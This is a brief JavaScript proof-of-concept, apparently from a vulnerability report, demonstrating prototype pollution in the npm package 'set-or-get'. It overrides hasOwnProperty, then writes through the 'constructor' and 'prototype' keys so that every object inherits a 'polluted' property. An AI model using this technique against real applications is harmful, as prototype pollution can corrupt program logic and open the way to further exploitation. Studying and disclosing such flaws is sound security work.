Object.prototype.hasOwnProperty = () => true;
var SetOrGet = require('set-or-get');
obj = {};
console.log({}.polluted);
SetOrGet(obj, 'constructor', 'prototype', {}).polluted = 'yes';
console.log({}.polluted);